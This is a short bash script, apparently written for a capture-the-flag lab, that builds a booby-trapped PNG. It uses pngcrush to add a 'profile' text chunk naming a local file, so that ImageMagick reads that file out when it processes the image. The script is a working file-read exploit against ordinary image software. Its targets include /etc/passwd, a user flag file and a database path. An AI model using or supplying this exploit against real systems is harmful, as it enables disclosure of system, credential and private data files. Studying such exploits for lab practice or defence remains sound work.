# This script adds malicious code inside a png so that imagemagick return any file
# requires pngcrush exiv2 imagemagick
SOURCE_IMAGE=$1
OUTPUT_IMAGE=$2
if [ -z $SOURCE_IMAGE ]
then
    echo "./exploit-magick.sh <path-to-png-image> <output-file>"
    exit 1
fi
if [ -z $OUTPUT_IMAGE ]
then
    echo "./exploit-magick.sh <path-to-png-image> <output-file>"
    exit 1
fi
#FILE_TO_READ="/etc/passwd"
FILE_TO_READ="/home/emily/user.txt"
#FILE_TO_READ="/var/db/pilgrimage"
pngcrush -text a "profile" $FILE_TO_READ $SOURCE_IMAGE $OUTPUT_IMAGE 
exiv2 -pS $OUTPUT_IMAGE

#CONVERTED_IMAGE="/tmp/poc.png"
#./magick convert $OUTPUT_IMAGE $CONVERTED_IMAGE